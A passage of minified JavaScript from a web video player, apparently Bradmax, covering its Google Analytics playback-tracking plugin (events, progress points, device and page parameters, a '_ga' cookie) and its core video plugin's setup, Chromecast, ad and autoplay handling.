null!=this.collectorTrackerId&&0<this.collectorTrackerId.length},addEventListeners:function(){this.areListenersAttached||(this.areListenersAttached=!0,W.add(this.context,"selectAudio",U(this,this.onControlEvent)),W.add(this.context,"selectSubtitles",U(this,this.onControlEvent)),W.add(this.context,"skinVolume",U(this,this.onControlEvent)),T.add(this.context,"ready",U(this,this.onVideoEvent)),T.add(this.context,"playing",U(this,this.onVideoEvent)),T.add(this.context,"paused",U(this,this.onVideoEvent)),T.add(this.context,"stopped",U(this,this.onVideoEvent)),T.add(this.context,"complete",U(this,this.onVideoEvent)),T.add(this.context,"currentTimeChange",U(this,this.onVideoEvent)),T.add(this.context,"durationChange",U(this,this.onVideoEvent)))},removeEventListeners:function(){this.areListenersAttached&&(this.areListenersAttached=!1,W.remove(this.context,"selectAudio",U(this,this.onControlEvent)),W.remove(this.context,"selectSubtitles",U(this,this.onControlEvent)),W.remove(this.context,"skinVolume",U(this,this.onControlEvent)),T.remove(this.context,"ready",U(this,this.onVideoEvent)),T.remove(this.context,"playing",U(this,this.onVideoEvent)),T.remove(this.context,"paused",U(this,this.onVideoEvent)),T.remove(this.context,"stopped",U(this,this.onVideoEvent)),T.remove(this.context,"complete",U(this,this.onVideoEvent)),T.remove(this.context,"currentTimeChange",U(this,this.onVideoEvent)),T.remove(this.context,"durationChange",U(this,this.onVideoEvent)))},onControlEvent:function(b){"selectSubtitles"==b.type&&(this.collector.get_customDimension().subtitle=b.data.name,this.collector.collectEvent("subtitle track"))},onVideoEvent:function(b){this.collector.videoCurrentTime=Math.floor(b.data.currentTime),null==this.collector.videoDuration&&this.collector.set_videoDuration(Math.floor(b.data.duration)),"playing"==b.type?this.collector.collectEvent("playing"):"paused"==b.type?0!=this.collector.videoCurrentTime&&this.collector.collectEvent("paused"):"stopped"==b.type?this.collector.collectEvent("stoped"):"complete"==b.type?this.collector.collectEvent("watched"):"currentTimeChange"==b.type&&this.collector.checkProgress()},__class__:Xe});var gf=function(b,c,d,q,X,ra,Aa){null==Aa&&(Aa=10),this.firstView=!0,this.set_videoDuration(ra),this.progressSecondsInterval=Aa,this.sender=new hf(b,c,d,q,X)};wa["bs.player.plugin.stats.ga.Collector"]=gf,gf.__name__="bs.player.plugin.stats.ga.Collector",gf.prototype={sender:null,customDimension:null,videoDuration:null,videoCurrentTime:null,firstView:null,sendedDataSecond:null,videoProgressPointKeys:null,videoProgressPoints:null,progressSecondsInterval:null,collectEvent:function(b){var c="player event";this.firstView&&"playing"==b&&(this.firstView=!1,b="started",c="view"),this.sender.event(c,b)},checkProgress:function(){0<this.videoCurrentTime&&this.sendedDataSecond!=this.videoCurrentTime&&0==this.videoCurrentTime%this.progressSecondsInterval&&this.collectProgressInSeconds()},collectProgressInSeconds:function(){this.sendedDataSecond=this.videoCurrentTime,this.sender.event("progress seconds","progress seconds",this.videoCurrentTime)},checkProgressPoint:function(){for(var b=0,c=this.videoProgressPointKeys;b<c.length;){var d=c[b];++b,(d=m.field(this.videoProgressPoints,d)).sended||d.sec!=this.videoCurrentTime||(d.sended=!0,this.collectProgressInPercents(d.act))}},collectProgressInPercents:function(b){this.sender.event("progress percent","progress percent",b)},get_customDimension:function(){return this.sender.customDimension},set_videoDuration:function(b){return null==this.videoProgressPoints&&this.set_videoProgressPoints(b),this.videoDuration=b},set_videoProgressPoints:function(b){return this.videoProgressPoints={progress25:{act:25,sec:Math.floor(.25*b),sended:!1},progress50:{act:50,sec:Math.floor(.5*b),sended:!1},progress75:{act:75,sec:Math.floor(.75*b),sended:!1},progress85:{act:85,sec:Math.floor(.85*b),sended:!1}},null==this.videoProgressPointKeys&&(this.videoProgressPointKeys=m.fields(this.videoProgressPoints)),this.videoProgressPoints},__class__:gf,__properties__:{set_videoProgressPoints:"set_videoProgressPoints",set_videoDuration:"set_videoDuration",get_customDimension:"get_customDimension"}};var jf=function(){qd.exists("_ga")?this.clientId=qd.get("_ga"):this.clientId=this.createClientId()};wa["bs.player.plugin.stats.ga.Cookie"]=jf,jf.__name__="bs.player.plugin.stats.ga.Cookie",jf.prototype={clientId:null,createClientId:function(){for(var d,b=Tc.UID_CHARS.length,c="",q=0;24>q;){switch(d=q++,d="xxxx-xxxx-xxxx-xxxx-xxxx".charAt(d)){case"-":case"_":break;default:d=Tc.UID_CHARS.charAt(p.random(b))}c+=d}return d=c,qd.set("_ga",d,63113904),d},__class__:jf};var kf=function(b,c){this.subtitle="",this.contentType=b,this.contentTags=c};wa["bs.player.plugin.stats.ga.CustomDimension"]=kf,kf.__name__="bs.player.plugin.stats.ga.CustomDimension",kf.prototype={subtitle:null,contentType:null,contentTags:null,addParameters:function(b){""!=this.subtitle&&b.addParameter("cd3",this.subtitle),null!=this.contentType&&b.addParameter("cd4",this.contentType),null!=this.contentTags&&0<this.contentTags.length&&b.addParameter("cd5",this.contentTags.join(","))},__class__:kf};var nf=function(){this.deviceInfo=new lf,this.documentInfo=new mf};wa["bs.player.plugin.stats.ga.DataProvider"]=nf,nf.__name__="bs.player.plugin.stats.ga.DataProvider",nf.prototype={deviceInfo:null,documentInfo:null,addParameters:function(b){this.deviceInfo.addParameters(b),this.documentInfo.addParameters(b)},__class__:nf};var mf=function(){this.host=this.page=this.title=this.encoding="";var b=window.document;this.host=b.location.host,this.page=b.location.pathname,this.title=b.title,this.encoding=b.characterSet};wa["bs.player.plugin.stats.ga.DocumentInfo"]=mf,mf.__name__="bs.player.plugin.stats.ga.DocumentInfo",mf.prototype={host:null,page:null,title:null,encoding:null,addParameters:function(b){b.addParameter("dh",this.host),b.addParameter("dp",this.page),b.addParameter("dt",this.title),b.addParameter("de",this.encoding)},toString:function(){return"DocumentInfo:{ host:"+this.host+", page:"+this.page+", title:"+this.title+", encoding:"+this.encoding+" }"},__class__:mf};var lf=function(){this.viewPortSize=this.scrResolution=this.scrColorResol=this.userLanguage=this.userAgent=this.javaEnabled=this.flashVersion="";var b=window,c=b.navigator,d=c.plugins,q=b.screen;for(this.viewPortSize=p.string(b.innerWidth)+"x"+p.string(b.innerHeight),this.userAgent=c.userAgent,this.scrResolution=q.width+"x"+q.height,this.scrColorResol=q.colorDepth+"-bits",this.userLanguage=c.language,this.javaEnabled=c.javaEnabled()?"1":"0",b=0,c=d.length;b<c;)if("Shockwave Flash"==d[q=b++].name){this.flashVersion=d[q].description.split("Shockwave Flash ").join("");break}};wa["bs.player.plugin.stats.ga.DeviceInfo"]=lf,lf.__name__="bs.player.plugin.stats.ga.DeviceInfo",lf.prototype={viewPortSize:null,scrResolution:null,scrColorResol:null,userLanguage:null,userAgent:null,javaEnabled:null,flashVersion:null,addParameters:function(b){b.addParameter("ua",this.userAgent),b.addParameter("sr",this.scrResolution),b.addParameter("sd",this.scrColorResol),b.addParameter("vp",this.viewPortSize),b.addParameter("ul",this.userLanguage),b.addParameter("je",this.javaEnabled),b.addParameter("fl",this.flashVersion)},toString:function(){return"DeviceInfo:{ viewPortSize:"+this.viewPortSize+", scrResolution:"+this.scrResolution+", scrColorResol:"+this.scrColorResol+", userLanguage:"+this.userLanguage+", userAgent:"+this.userAgent+", javaEnabled:"+this.javaEnabled+", flashVersion:"+this.flashVersion+" }"},__class__:lf};var hf=function(b,c,d,q,X){this.url=this.trackerId=this.videoId="",this.hitPool=[],this.hitTimeStampMs=0,this.hitIntervalMs=1e4,this.cookie=new jf,this.customDimension=new kf(q,X),this.dataProvider=new nf,this.url=b,this.trackerId=c,this.videoId=d};wa["bs.player.plugin.stats.ga.DataSender"]=hf,hf.__name__="bs.player.plugin.stats.ga.DataSender",hf.prototype={customDimension:null,cookie:null,url:null,trackerId:null,dataProvider:null,videoId:null,hitIntervalMs:null,hitPool:null,hitTimeStampMs:null,event:function(b,c,d,q){null==q&&(q=!1);var X=new L(this.url);X.addParameter("v","1"),X.addParameter("tid",this.trackerId),X.addParameter("cid",this.cookie.clientId),X.addParameter("ds","web"),X.addParameter("t","event"),X.addParameter("ec",b),X.addParameter("ea",c),X.addParameter("el",this.videoId),null!=d&&X.addParameter("ev",d),X.addParameter("ni",q?"1":"0"),this.dataProvider.addParameters(X),this.customDimension.addParameters(X),X.addParameter("z",Math.floor(1e9*Math.random())+""),this.hitPool.push(new Md(X)),this.sendHit()},sendHit:function(){if(0<this.hitPool.length){var b=Md.stamp()-this.hitTimeStampMs;b>this.hitIntervalMs?(this.hitTimeStampMs=Md.stamp(),this.hitPool.shift().send(),0<this.hitPool.length&&this.sendHitDelay(this.hitIntervalMs)):this.sendHitDelay(this.hitIntervalMs-b)}},sendHitDelay:function(b){Rb.delay(U(this,this.sendHit),b)},__class__:hf};var Md=function(b){this.timeStampMs=Md.stamp(),this.request=b};wa["bs.player.plugin.stats.ga.HitData"]=Md,Md.__name__="bs.player.plugin.stats.ga.HitData",Md.stamp=function(){return Math.round(da.now()/1e3*1e3)},Md.prototype={timeStampMs:null,request:null,send:function(){var b=Md.stamp()-this.timeStampMs;this.request.addParameter("qt",b),this.request.request(!1)},__class__:Md};var kd=function(){this.videoPlaybackRate=1,this.volumeValue=this.videoCurrentTime=this.permamentPlaybackErrorTimer=this.lastMediaError=null,this.minAudioTracksForInfo=2,this.chromecastSession=this.chromecastSender=xf,this.chromecastConnected=!1,this.videoPlayers=[],this.videoPlayersClasses=[],lb.call(this),this.pluginConfig={},this.isInStreamAdPlaying=this.isAdVideoTagInitializedForMobiles=!1,this.lastDataProviderEvent=this.currentMedia=null,this.shouldVideoPlay=!1};wa["bs.player.plugin.video.Video"]=kd,kd.__name__="bs.player.plugin.video.Video",kd.__super__=lb,kd.prototype=Ja(lb.prototype,{videoPlayersClasses:null,videoPlayers:null,nativeVideo:null,nativeAdVideo:null,chromecastConnected:null,chromecastSession:null,chromecastSender:null,htmlVideo:null,htmlAdVideo:null,div:null,divFlash:null,minAudioTracksForInfo:null,playerInstance:null,adPlayerInstance:null,externalSubtitlesController:null,subtitlesRenderer:null,isAdVideoTagInitializedForMobiles:null,isInStreamAdPlaying:null,volumeValue:null,currentMedia:null,videoCurrentTime:null,lastDataProviderEvent:null,permamentPlaybackErrorTimer:null,lastMediaError:null,shouldVideoPlay:null,videoPlaybackRate:null,isSingleVideoTagPlay:function(){return!(!h.isiOS&&"Safari"!=h.browserName)||h.isSamsungSmartTVTizen},hasInStreamAds:function(){var b=this.get_variables();return Object.prototype.hasOwnProperty.call(b,"yospace")},hasDefinedAds:function(){var b=this.get_variables();return!!Object.prototype.hasOwnProperty.call(b,"freewheel")||(b=this.get_variables(),Object.prototype.hasOwnProperty.call(b,"advertisement"))},hasAdvertisementPlugin:function(){if(null==this.get_configuration()||null==this.get_configuration().plugins)return!1;for(var b=0,c=this.get_configuration().plugins;b<c.length;){var d=c[b];if(++b,"FreeWheel"==d.name||"AdvertisementDataProvider"==d.name)return!0}return!1},create:function(){if(lb.prototype.create.call(this),this.htmlVideo=this.getVideoElementReadyForAutoplayOrCreate(),this.htmlVideo.controls=!1,this.isSingleVideoTagPlay()?this.htmlAdVideo=this.htmlVideo:(this.htmlAdVideo=this.getVideoElementReadyForAutoplayOrCreate(),this.htmlAdVideo.controls=!1),this.htmlAdVideo.classList.add("bs-v-supporting-ad-play"),this.shouldVideoPlay=1==this.get_variables().autoplay,h.isiOS&&"Safari"==h.browserName&&1==this.get_variables().autoplay&&1==this.get_variables().mute&&(this.get_variables().iosInlineVideo=!0,this.log("BRADMAX PLAYER NOTICE:\nBrowser run with iosInlineVideo:true mode, because it is required for autoplay muted video for iOS.\n","warn")),h.isiOS){var b=this.get_variables();b=Object.prototype.hasOwnProperty.call(b,"iosInlineVideo")}else b=!1;b&&fb.__cast(m.field(this.get_variables(),"iosInlineVideo"),be)&&(this.htmlVideo.setAttribute("playsinline",""),this.htmlVideo.setAttribute("webkit-playsinline","")),this.initVideoElementSize(this.htmlVideo),this.initVideoElementSize(this.htmlAdVideo),b=this.get_variables(),Object.prototype.hasOwnProperty.call(b,"mute")&&fb.__cast(m.field(this.get_variables(),"mute"),be)&&(this.htmlVideo.muted=this.htmlAdVideo.muted=!0),b=this.get_variables(),Object.prototype.hasOwnProperty.call(b,"playbackRate")&&(b=m.field(this.get_variables(),"playbackRate"),!isNaN(b)&&isFinite(b)&&-1<=b&&(this.videoPlaybackRate=b)),this.updateVideoMediaElementCrossOrigin(),this.triggerVideoMediaElementInitEvent(),this.div=this.get_parentDisplay(),this.divFlash=window.document.createElement("div"),this.div.appendChild(this.divFlash),this.isSingleVideoTagPlay()||this.div.appendChild(this.htmlAdVideo),this.div.appendChild(this.htmlVideo),this.nativeVideo=this.htmlVideo,this.nativeAdVideo=this.htmlAdVideo,this.initVideoPlayersClasses(),b=this.context,ja.add(b,ja.CONNECTED,U(this,this.onChromecastConnect)),ja.add(b,ja.DISCONNECTED,U(this,this.onChromecastDisonnect)),W.add(b,"skinPause",U(this,this.onPauseEvent)),W.add(b,"skinStop",U(this,this.onStopEvent)),W.add(b,"skinPlay",U(this,this.onPlayEvent)),W.add(b,"skinPlayPause",U(this,this.onPlayPauseEvent)),W.add(b,"skinSeek",U(this,this.onSeekEvent)),W.add(b,"selectAudio",U(this,this.onSelectAudioEvent)),W.add(b,"selectSubtitles",U(this,this.onSelectSubtitlesEvent)),W.add(b,"skinVolume",U(this,this.onVolumeEvent)),W.add(b,"skinMute",U(this,this.onMuteEvent)),W.add(b,"skinUnmute",U(this,this.onUnmuteEvent));var c=U(this,this.onSetDataEvent);aa.add(b,"mediaMetadataData",(function(q){c(q,!1)}));var d=U(this,this.onSetDataEvent);aa.add(b,"adMetadataData",(function(q){d(q,!0)})),na.add(b,"resize",U(this,this.onPlayerResizeEvent)),T.add(b,"ready",U(this,this.onVideoReadyEvent)),T.add(b,"connectionError",U(this,this.onNetworkErrorEvent)),T.add(b,"mediaError",U(this,this.onVideoErrorEvent)),T.add(b,"loadError",U(this,this.onVideoErrorEvent)),T.add(b,"currentTimeChange",U(this,this.onVideoTimeChange)),T.add(b,"drmAuthenticationError",U(this,this.onVideoDrmAuthError)),T.add(b,"drmModuleCrush",U(this,this.onVideoDrmModuleCrush)),Q.add(b,"adPlay",U(this,this.onAdPlay)),Q.add(b,"adPause",U(this,this.onAdPause)),Q.add(b,"adResume",U(this,this.onAdResume)),Q.add(b,"adMediaError",U(this,this.onAdErrorEvent)),T.add(b,"playing",U(this,this.onVideoPlaying)),Q.add(b,"adPlaying",U(this,this.onAdVideoPlaying)),T.add(b,"currentTimeChange",U(this,this.onVideoPlaying)),Q.add(b,"adCurrentTimeChange",U(this,this.onAdVideoPlaying)),Q.add(b,"adInStreamPlaying",U(this,this.onAdInStreamPlaying)),Q.add(b,"adInStreamPlayingSilent",U(this,this.onAdInStreamPlaying)),Q.add(b,"adInStreamEnd",U(this,this.onAdInStreamEnd)),Q.add(b,"adInStreamEndSilent",U(this,this.onAdInStreamEnd)),Q.add(b,"adConnectionError",U(this,this.onNetworkErrorEvent)),W.add(b,"setVideoPlaybackRate",U(this,this.onSetVideoPlaybackRate)),W.add(b,"reloadVideoAfterNetworkProblem",U(this,this.onReloadVideoAfterNetworkProblem)),this.setDefaultVariablesFromVideoPluginConfig(),this.subtitlesRenderer=new ac(this.context,this.get_parentDisplay()),this.externalSubtitlesController=new of(this.context,this.subtitlesRenderer),null!=this.get_variables().locale&&(Yb.locale=this.get_variables().locale),window.document.removeEventListener("visibilitychange",U(this,this.onSaveBandwidthModeVisibilityChange)),b=this.get_variables(),Object.prototype.hasOwnProperty.call(b,"saveBandwidthMode")&&fb.__cast(this.get_variables().saveBandwidthMode,be)&&window.document.addEventListener("visibilitychange",U(this,this.onSaveBandwidthModeVisibilityChange))},onSaveBandwidthModeVisibilityChange:function(){null!=this.playerInstance&&this.playerInstance.saveBandwidthModeVisibilityChange("visible"!=window.document.visibilityState)},initVideoElementSize:function(b){null!=b&&null!=b.style&&(b.style.position="absolute",b.style.top="0",b.style.left="0",b.style.width="100%",b.style.height="100%")},postActivate:function(){lb.prototype.postActivate.call(this),this.updateVideoMediaElementCrossOrigin(),this.triggerVideoMediaElementInitEvent(),1==this.get_variables().mute&&(m.deleteField(this.get_variables(),"mute"),new W("skinMute").dispatch(this.context))},updateVideoMediaElementCrossOrigin:function(){if(null!=this.htmlVideo){var b=this.get_variables();Object.prototype.hasOwnProperty.call(b,"anonymousCrossOrigin")&&fb.__cast(m.field(this.get_variables(),"anonymousCrossOrigin"),be)?"anonymous"!=this.htmlVideo.crossOrigin&&this.htmlVideo.setAttribute("crossOrigin","anonymous"):null!=this.htmlVideo.crossOrigin&&this.htmlVideo.removeAttribute("crossOrigin")}},triggerVideoMediaElementInitEvent:function(){if(null!=this.htmlVideo){var b=new T("videoMediaElementInit");b.data=this.htmlVideo,b.dispatch(this.context)}},destroy:function(){ja.remove(this.context,ja.CONNECTED,U(this,this.onChromecastConnect)),ja.remove(this.context,ja.DISCONNECTED,U(this,this.onChromecastDisonnect)),W.remove(this.context,"skinPause",U(this,this.onPauseEvent)),W.remove(this.context,"skinPlay",U(this,this.onPlayEvent)),W.remove(this.context,"skinPlayPause",U(this,this.onPlayPauseEvent)),W.remove(this.context,"skinSeek",U(this,this.onSeekEvent)),W.remove(this.context,"selectAudio",U(this,this.onSelectAudioEvent)),W.remove(this.context,"selectSubtitles",U(this,this.onSelectSubtitlesEvent)),W.remove(this.context,"skinVolume",U(this,this.onVolumeEvent)),W.remove(this.context,"skinMute",U(this,this.onMuteEvent)),W.remove(this.context,"skinUnmute",U(this,this.onUnmuteEvent));var b=U(this,this.onSetDataEvent),c=function(ra){b(ra,!1)};aa.remove(this.context,"mediaMetadataData",c);var d=U(this,this.onSetDataEvent);c=function(ra){d(ra,!0)},aa.remove(this.context,"adMetadataData",c),na.remove(this.context,"resize",U(this,this.onPlayerResizeEvent)),T.remove(this.context,"ready",U(this,this.onVideoReadyEvent)),T.remove(this.context,"connectionError",U(this,this.onNetworkErrorEvent)),T.remove(this.context,"mediaError",U(this,this.onVideoErrorEvent)),T.remove(this.context,"loadError",U(this,this.onVideoErrorEvent)),T.remove(this.context,"currentTimeChange",U(this,this.onVideoTimeChange)),T.remove(this.context,"drmAuthenticationError",U(this,this.onVideoDrmAuthError)),Q.remove(this.context,"adPlay",U(this,this.onAdPlay)),Q.remove(this.context,"adPause",U(this,this.onAdPause)),Q.remove(this.context,"adResume",U(this,this.onAdResume)),Q.remove(this.context,"adMediaError",U(this,this.onAdErrorEvent)),T.remove(this.context,"playing",U(this,this.onVideoPlaying)),Q.remove(this.context,"adPlaying",U(this,this.onAdVideoPlaying)),T.remove(this.context,"currentTimeChange",U(this,this.onVideoPlaying)),Q.remove(this.context,"adCurrentTimeChange",U(this,this.onAdVideoPlaying)),Q.remove(this.context,"adInStreamPlaying",U(this,this.onAdInStreamPlaying)),Q.remove(this.context,"adInStreamPlayingSilent",U(this,this.onAdInStreamPlaying)),Q.remove(this.context,"adInStreamEnd",U(this,this.onAdInStreamEnd)),Q.remove(this.context,"adInStreamEndSilent",U(this,this.onAdInStreamEnd)),Q.remove(this.context,"adConnectionError",U(this,this.onNetworkErrorEvent)),W.remove(this.context,"setVideoPlaybackRate",U(this,this.onSetVideoPlaybackRate)),W.remove(this.context,"reloadVideoAfterNetworkProblem",U(this,this.onReloadVideoAfterNetworkProblem)),null!=this.externalSubtitlesController&&(this.externalSubtitlesController.destroy(),this.externalSubtitlesController=null),null!=this.subtitlesRenderer&&(this.subtitlesRenderer.destroy(),this.subtitlesRenderer=null),null!=this.currentMedia&&null!=this.currentMedia.drmCustomLicenseServerHandler&&this.currentMedia.drmCustomLicenseServerHandler.destroy(),this.currentMedia=null,c=0;for(var q=this.videoPlayers;c<q.length;){var X=q[c];++c,X.destroy()}this.videoPlayers=null,null!=this.playerInstance&&this.playerInstance.destroy(),this.playerInstance=null,null!=this.adPlayerInstance&&this.adPlayerInstance.destroy(),this.adPlayerInstance=null,null!=this.nativeVideo&&null!=this.nativeVideo.parentElement&&null!=this.nativeVideo.load&&(this.nativeVideo.setAttribute("src",""),this.nativeVideo.load(),this.nativeVideo.parentElement.removeChild(this.nativeVideo)),this.nativeVideo=null,null!=this.nativeAdVideo&&null!=this.nativeAdVideo.parentElement&&null!=this.nativeAdVideo.load&&(this.nativeAdVideo.setAttribute("src",""),this.nativeAdVideo.load(),this.nativeAdVideo.parentElement.removeChild(this.nativeAdVideo)),this.nativeAdVideo=null,null!=this.htmlVideo&&null!=this.htmlVideo.parentElement&&null!=this.htmlVideo.load&&(this.htmlVideo.setAttribute("src",""),this.htmlVideo.load(),this.htmlVideo.parentElement.removeChild(this.htmlVideo)),this.htmlVideo=null,null!=this.htmlAdVideo&&null!=this.htmlAdVideo.parentElement&&null!=this.htmlAdVideo.load&&(this.htmlAdVideo.setAttribute("src",""),this.htmlAdVideo.load(),this.htmlAdVideo.parentElement.removeChild(this.htmlAdVideo)),this.htmlAdVideo=null,null!=this.divFlash&&null!=this.divFlash.parentElement&&this.divFlash.parentElement.removeChild(this.divFlash),this.isAdVideoTagInitializedForMobiles=this.videoPlayersClasses=this.div=this.divFlash=null,this.videoPlaybackRate=1,window.document.removeEventListener("visibilitychange",U(this,this.onSaveBandwidthModeVisibilityChange)),lb.prototype.destroy.call(this)},initVideoPlayersClasses:function(){if("Safari"==h.browserName&&!h.isSamsungSmartTVTizen||h.isMobile()){this.videoPlayersClasses.push(Pb);for(var b=0,c=this.get_player().pluginsVideo;b<c.length;){var d=c[b];++b,this.videoPlayersClasses.push(fb.getClass(d))}}else{for(b=0,c=this.get_player().pluginsVideo;b<c.length;)d=c[b],++b,this.videoPlayersClasses.push(fb.getClass(d));this.videoPlayersClasses.push(Pb)}},moveSelectedMediaSourceToFirstPosition:function(b,c){var d=[];d.push(b[c]);for(var q=0,X=b.length;q<X;){var ra=q++;ra!=c&&d.push(b[ra])}return d},onChromecastConnect:function(b){this.chromecastConnected=!0,this.chromecastSession=b.data.session,this.chromecastSender=b.data.sender,this.videoPlayersClasses[0].__name__!=Nc.__name__&&this.videoPlayersClasses.splice(0,0,Nc),this.onSetDataEvent(this.lastDataProviderEvent,!1),this.updateChromecastPlayerInstanceSession(this.chromecastSession,this.chromecastSender)},onChromecastDisonnect:function(b){this.chromecastConnected=!1,this.chromecastSession=null,this.playerInstance instanceof Nc&&this.playerInstance.onChromecastDisonnect(),this.videoPlayersClasses[0].__name__==Nc.__name__&&this.videoPlayersClasses.shift(),this.onSetDataEvent(this.lastDataProviderEvent,!1),null!=this.currentMedia&&0<this.currentMedia.mediaPlaybackInfo.currentTime&&(this.currentMedia.mediaUserSettings.resumePostion=this.currentMedia.mediaPlaybackInfo.currentTime),null!=this.currentMedia&&this.currentMedia.mediaPlaybackInfo.isPlaying&&new W("skinPlay").dispatch(this.context)},updateChromecastPlayerInstanceSession:function(b,c){this.playerInstance instanceof Nc&&this.playerInstance.setSession(this.chromecastSession,this.chromecastSender)},setupParamsForFallbackMechanism:function(b,c){this.currentMedia=b,this.lastDataProviderEvent=c,this.videoCurrentTime=null,0<this.currentMedia.mediaUserSettings.resumePostion&&(this.videoCurrentTime=this.currentMedia.mediaUserSettings.resumePostion)},onSetDataEvent:function(b,c){var d=this;if(this.updateVideoMediaElementCrossOrigin(),(h.isiOS||"Safari"==h.browserName)&&1==this.get_variables().autoplay&&"1"!=this.htmlVideo.getAttribute(F.VIDEO_TAG_FOR_AUTOPLAY_INITIALSED))if(F.hasHtmlVideoReadyForAutoplay())this.recreateNativeVideoElement();else if(F.hasPendingVideoElementsForLaterAutoplay())return void F.addListenerForVideoElementForAutoplay((function(){d.onSetDataEvent(b,c)}));if(null!=this.playerInstance&&(this.isSingleVideoTagPlay()||this.hasInStreamAds())&&this.playerInstance.destroy(),null!=this.videoPlayersClasses&&null!=b.data){var q=-1,X=null;c?X=b.data.media:(X=b.data,this.setupParamsForFallbackMechanism(X,b));var ra=this.videoPlayersClasses;Object.prototype.hasOwnProperty.call(X.customParams.h,"preferedVideoPlayersClassesOrder")&&(ra=this.makePreferedVideoClassesInOrder(X.customParams.h.preferedVideoPlayersClassesOrder));for(var Aa=0,Qa=ra.length;Aa<Qa;){var Wa=Aa++,Cb=ra[Wa];if(!Object.prototype.hasOwnProperty.call(X.failedPlaybackPlayers.h,ra[Wa].__name__)){for(var Ub=0,Mb=X.source.length;Ub<Mb;){var Bc=Ub++;if(Cb.canPlay(X.source[Bc])){q=Wa,X.source=this.moveSelectedMediaSourceToFirstPosition(X.source,Bc);break}}if(-1<q)break}}if(0>q)this.dispatchNotSupportedVideoError();else{for(Ub=null,Aa=0,Qa=ra.length;Aa<Qa;)Cb=ra[Wa=Aa++],Wa==q&&(c?(this.shouldPlayerInstanceBeUpdated(this.adPlayerInstance,ra[Wa])&&this.adPlayerInstance.destroy(),Ub=this.adPlayerInstance=Cb.getInstance(this.context,c)):(this.shouldPlayerInstanceBeUpdated(this.playerInstance,ra[Wa])&&this.playerInstance.destroy(),Ub=this.playerInstance=Cb.getInstance(this.context,c)),Ub.variables=this.get_variables(),Ub.minAudioTracksForInfo=this.minAudioTracksForInfo,!c&&"Safari"!=h.browserName&&null!=this.nativeVideo.textTracks&&0<this.nativeVideo.textTracks.length&&null!=this.nativeVideo.replaceWith&&this.recreateNativeVideoElement(),Ub.attachVideo(c?this.nativeAdVideo:this.nativeVideo));null!=this.videoPlaybackRate&&!isNaN(this.videoPlaybackRate)&&Ub.setPlaybackRate(this.videoPlaybackRate),null!=this.volumeValue&&Ub.volume(this.volumeValue),Ub.setData(X),this.externalSubtitlesController.setData(X)}}},recreateNativeVideoElement:function(){var b=this.getVideoElementReadyForAutoplayOrCreate();if(b.controls=!1,null!=this.nativeVideo.attributes)try{for(var c=this.nativeVideo.attributes,d=0;d<c.length;){var q=c[d];++d,"src"!=q.name&&b.setAttribute(q.name,q.value)}}catch(X){}b.muted=this.htmlVideo.muted,b.volume=this.htmlVideo.volume,b.playbackRate=this.htmlVideo.playbackRate,this.htmlVideo=b,this.setDefaultPoster(this.htmlVideo),this.nativeVideo.replaceWith(this.htmlVideo),this.nativeVideo=this.htmlVideo,this.updateVideoMediaElementCrossOrigin(),this.triggerVideoMediaElementInitEvent()},dispatchNotSupportedVideoError:function(){var b=new T("playbackPermamentError");b.data={additionalData:{message:"Provided video is not supported."}},this.lastMediaError=b,this.showMediaErrorMessage(b)},getVideoElementReadyForAutoplayOrCreate:function(){var b=F.getHtmlVideoReadyForAutoplay(),c=h.isMobile()&&"Safari"==h.browserName;if(c&&null==b&&null!=kd.lastUsedVideoElement){for(var d=window.bradmax.player.list(),q=!1,X=0;X<d.length;){var ra=d[X];if(++X,ra.uid==kd.lastUsedVideoElementContext){q=!0;break}}kd.lastUsedVideoElementContext!=this.context&&q||(b=kd.lastUsedVideoElement)}return null==b&&(b=window.document.createElement("video")),c&&(kd.lastUsedVideoElement=b,kd.lastUsedVideoElementContext=this.context),this.setDefaultPoster(b),b},setDefaultPoster:function(b){h.isAndroid&&null!=b&&(b.poster="data:image/gif;base64,R0lGODlhAQABAIAAAAUEBAAAACwAAAAAAQABAAACAkQBADs=")},makePreferedVideoClassesInOrder:function(b){for(var c=[],d=0;d<b.length;){var q=b[d];++d,-1!=this.videoPlayersClasses.indexOf(q)&&c.push(q)}return c},shouldPlayerInstanceBeUpdated:function(b,c){return null!=b&&fb.getClass(b)!=c},setDefaultVariablesFromVideoPluginConfig:function(){for(var b=["qualitySelectionEnabled","minAudioTracksForInfo"],c=0;c<b.length;){var d=b[c];if(++c,null!=this.pluginConfig&&Object.prototype.hasOwnProperty.call(this.pluginConfig,d)&&null!=this.get_variables()){var q=this.get_variables();q=!Object.prototype.hasOwnProperty.call(q,d)}else q=!1;q&&(this.get_variables()[d]=m.field(this.pluginConfig,d))}null!=this.get_variables()?(q=this.get_variables(),q=Object.prototype.hasOwnProperty.call(q,"minAudioTracksForInfo")):q=!1,q&&(1<=(b=m.field(this.get_variables(),"minAudioTracksForInfo"))&&(this.minAudioTracksForInfo=b))},onPlayerResizeEvent:function(b){null==this.playerInstance&&b.data instanceof Vb||this.playerInstance.playerResize(b.data)},onSetVideoPlaybackRate:function(b){this.videoPlaybackRate=parseFloat(b.data),null==this.playerInstance||null==this.videoPlaybackRate||isNaN(this.videoPlaybackRate)||this.playerInstance.setPlaybackRate(this.videoPlaybackRate)},onReloadVideoAfterNetworkProblem:function(b){this.reloadVideoAfterNetworkProblem()},onVideoReadyEvent:function(b){},onPauseEvent:function(b){null!=this.playerInstance&&(this.shouldVideoPlay=!1,this.playerInstance.pause())},onStopEvent:function(b){null!=this.playerInstance&&(this.shouldVideoPlay=!1,this.playerInstance.pause(),this.playerInstance.destroy())},log:function(b,c){null==c&&(c="log"),console&&("error"==c?console.error(b):"warn"==c?console.warn(b):console.log(b))},initAdVideoTagForMobilesAndPropagate:function(){if(null==this.playerInstance)return!1;var b=!0;if(!this.isAdVideoTagInitializedForMobiles&&!h.isWebView()&&(h.isMobile()||"Safari"==h.browserName)&&this.hasDefinedAds()&&this.hasAdvertisementPlugin()){if(!this.isSingleVideoTagPlay()||null==this.playerInstance||this.playerInstance instanceof Pb||(this.playerInstance.destroy(),b=!1),this.isAdVideoTagInitializedForMobiles=!0,null==this.adPlayerInstance){this.adPlayerInstance=Pb.getInstance(this.context,!0),this.adPlayerInstance.variables=this.get_variables(),this.adPlayerInstance.attachVideo(this.nativeAdVideo);var c=new va,d=new Da;d.url=F.VIDEO_SRC_FOR_COLLECT_AUTOPLAY,c.source=[d],this.adPlayerInstance.setData(c)}this.adPlayerInstance.play(),this.adPlayerInstance.pause()}return 